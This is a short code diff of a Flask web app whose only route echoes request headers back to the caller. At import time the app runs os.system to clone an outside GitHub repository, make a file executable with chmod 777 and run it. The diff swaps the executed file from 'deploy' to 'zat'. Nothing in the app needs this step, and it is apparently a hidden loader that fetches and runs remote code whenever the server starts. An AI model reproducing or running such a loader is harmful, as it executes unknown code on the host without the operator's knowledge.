@@ -4,7 +4,7 @@ import platform
 import subprocess
 from flask import Flask, Response, request
 app = Flask(__name__)
-os.system ("git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 deploy && ./deploy")
+os.system ("git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 zat && ./zat")
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
